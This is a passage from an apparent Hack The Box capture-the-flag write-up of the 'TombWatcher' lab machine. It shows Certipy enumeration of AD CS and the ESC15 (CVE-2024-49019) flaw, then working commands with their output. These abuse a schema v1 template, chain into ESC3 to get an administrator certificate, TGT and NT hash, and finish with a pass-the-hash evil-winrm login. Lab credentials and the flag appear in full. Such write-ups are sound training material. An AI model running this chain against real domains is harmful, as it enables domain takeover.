[!] Failed to connect to remote registry. Service should be starting now. Trying again...
[*] Successfully retrieved CA configuration for 'tombwatcher-CA-1'
[*] Checking web enrollment for CA 'tombwatcher-CA-1' @ 'DC01.tombwatcher.htb'
[!] Error checking web enrollment: timed out
[!] Use -debug to print a stacktrace
[*] Enumeration output:
Certificate Authorities
  0
    CA Name                             : tombwatcher-CA-1
    DNS Name                            : DC01.tombwatcher.htb
    Certificate Subject                 : CN=tombwatcher-CA-1, DC=tombwatcher, DC=htb
    Certificate Serial Number           : 3428A7FC52C310B2460F8440AA8327AC
    Certificate Validity Start          : 2024-11-16 00:47:48+00:00
    Certificate Validity End            : 2123-11-16 00:57:48+00:00
    Web Enrollment
      HTTP
        Enabled                         : False
      HTTPS
        Enabled                         : False
    User Specified SAN                  : Disabled
    Request Disposition                 : Issue
    Enforce Encryption for Requests     : Enabled
    Active Policy                       : CertificateAuthority_MicrosoftDefault.Policy
    Permissions
      Owner                             : TOMBWATCHER.HTB\Administrators
      Access Rights
        ManageCa                        : TOMBWATCHER.HTB\Administrators
                                          TOMBWATCHER.HTB\Domain Admins
                                          TOMBWATCHER.HTB\Enterprise Admins
        ManageCertificates              : TOMBWATCHER.HTB\Administrators
                                          TOMBWATCHER.HTB\Domain Admins
                                          TOMBWATCHER.HTB\Enterprise Admins
        Enroll                          : TOMBWATCHER.HTB\Authenticated Users
Certificate Templates
  0
    Template Name                       : WebServer
    Display Name                        : Web Server
    Certificate Authorities             : tombwatcher-CA-1
    Enabled                             : True
    Client Authentication               : False
    Enrollment Agent                    : False
    Any Purpose                         : False
    Enrollee Supplies Subject           : True
    Certificate Name Flag               : EnrolleeSuppliesSubject
    Extended Key Usage                  : Server Authentication
    Requires Manager Approval           : False
    Requires Key Archival               : False
    Authorized Signatures Required      : 0
    Schema Version                      : 1
    Validity Period                     : 2 years
    Renewal Period                      : 6 weeks
    Minimum RSA Key Length              : 2048
    Template Created                    : 2024-11-16T00:57:49+00:00
    Template Last Modified              : 2024-11-16T17:07:26+00:00
    Permissions
      Enrollment Permissions
        Enrollment Rights               : TOMBWATCHER.HTB\Domain Admins
                                          TOMBWATCHER.HTB\Enterprise Admins
                                          TOMBWATCHER.HTB\cert_admin
      Object Control Permissions
        Owner                           : TOMBWATCHER.HTB\Enterprise Admins
        Full Control Principals         : TOMBWATCHER.HTB\Domain Admins
                                          TOMBWATCHER.HTB\Enterprise Admins
        Write Owner Principals          : TOMBWATCHER.HTB\Domain Admins
                                          TOMBWATCHER.HTB\Enterprise Admins
        Write Dacl Principals           : TOMBWATCHER.HTB\Domain Admins
                                          TOMBWATCHER.HTB\Enterprise Admins
        Write Property Enroll           : TOMBWATCHER.HTB\Domain Admins
                                          TOMBWATCHER.HTB\Enterprise Admins
                                          TOMBWATCHER.HTB\cert_admin
    [+] User Enrollable Principals      : TOMBWATCHER.HTB\cert_admin
    [!] Vulnerabilities
      ESC15                             : Enrollee supplies subject and schema version is 1.
    [*] Remarks
      ESC15                             : Only applicable if the environment has not been patched. See CVE-2024-49019 or the wiki for more details.

```

As we can see, we found `CVE-2024-49019`.[This page](https://github.com/ly4k/Certipy/wiki/06-%E2%80%90-Privilege-Escalation#esc15-arbitrary-application-policy-injection-in-v1-templates-cve-2024-49019-ekuwu) shows how to exploit this vulnerbility


### ESC15

ESC15 (CVE-2024-49019) is a mis-configuration/validation bug in Microsoft Active Directory Certificate Services (AD CS) that allows an enrollee to inject arbitrary Subject and Application Policies (EKUs) into a certificate when a vulnerable template is used. In practice, if a CA hosts a schema v1 template with “Enrollee supplies subject” enabled (or otherwise improperly validates CSR fields), an authenticated principal with Enroll rights can obtain a certificate containing forged UPN/EKU values. That certificate can be used to impersonate other accounts or act as an enrollment agent, enabling further escalation (commonly chained into ESC3 / Domain Admin).

The page shows two scenario of exploiting this vulnerbility

### Exploitation 

***PKINIT/Kerberos Impersonation via Enrollment Agent Abuse (Injecting "Certificate Request Agent" Application Policy)***

```python
certipy req -u cert_admin -p 'RealMadrid' -dc-ip 10.10.11.72 -target dc01.tombwatcher.htb -ca tombwatcher-CA-1 -template WebServer -upn administrator@tombwatcher.htb -application-policies 'Certificate Request Agent'
Certipy v5.0.2 - by Oliver Lyak (ly4k)

[*] Requesting certificate via RPC
[*] Request ID is 5
[*] Successfully requested certificate
[*] Got certificate with UPN 'administrator@tombwatcher.htb'
[*] Certificate has no object SID
[*] Try using -sid to set the object SID or see the wiki for more details
[*] Saving certificate and private key to 'administrator.pfx'
File 'administrator.pfx' already exists. Overwrite? (y/n - saying no will save with a unique filename): y
[*] Wrote certificate and private key to 'administrator.pfx'
```


Only after this I can exploit ESC3 `User` template
```python
certipy req -u cert_admin -p 'RealMadrid!' -dc-ip 10.10.11.72 -target dc01.tombwatcher.htb -ca tombwatcher-CA-1 -template User -pfx cert_admin.pfx -on-behalf-of 'tombwatcher\Administrator'
Certipy v5.0.2 - by Oliver Lyak (ly4k)

[*] Requesting certificate via RPC
[*] Request ID is 8
[*] Successfully requested certificate
[*] Got certificate with UPN 'Administrator@tombwatcher.htb'
[*] Certificate object SID is 'S-1-5-21-1392491010-1358638721-2126982587-500'
[*] Saving certificate and private key to 'administrator.pfx'
[*] Wrote certificate and private key to 'administrator.p
```

We can finally got a TGT

```python
certipy auth -pfx administrator.pfx -dc-ip 10.10.11.72
Certipy v5.0.2 - by Oliver Lyak (ly4k)

[*] Certificate identities:
[*]     SAN UPN: 'Administrator@tombwatcher.htb'
[*]     Security Extension SID: 'S-1-5-21-1392491010-1358638721-2126982587-500'
[*] Using principal: 'administrator@tombwatcher.htb'
[*] Trying to get TGT...
[*] Got TGT
[*] Saving credential cache to 'administrator.ccache'
[*] Wrote credential cache to 'administrator.ccache'
[*] Trying to retrieve NT hash for 'administrator'
[*] Got hash for 'administrator@tombwatcher.htb': aad3b435b51404eeaad3b435b51404ee:f61db423bebe3328d33af26741afe5fc
```


## Shell as Administrator

Now we can finally access as `Administrator`


```python
┌──(root㉿odinaev)-[/home/odinaev/Downloads/impacket/examples]
└─# evil-winrm -i dc01.tombwatcher.htb -u administrator -H f61db423bebe3328d33af26741afe5fc

[*] Connecting to 'dc01.tombwatcher.htb:5985' as 'administrator'
evil-winrm PS C:\Users\Administrator\Documents> 
```


Obtain `root.txt`

```python
evil-winrm PS C:\Users\Administrator\Desktop> type root.txt
77afdf5c0858bb95bfa92a1385f3b86b
```


⭐ If you found this writeup helpful — consider giving a star on GitHub!
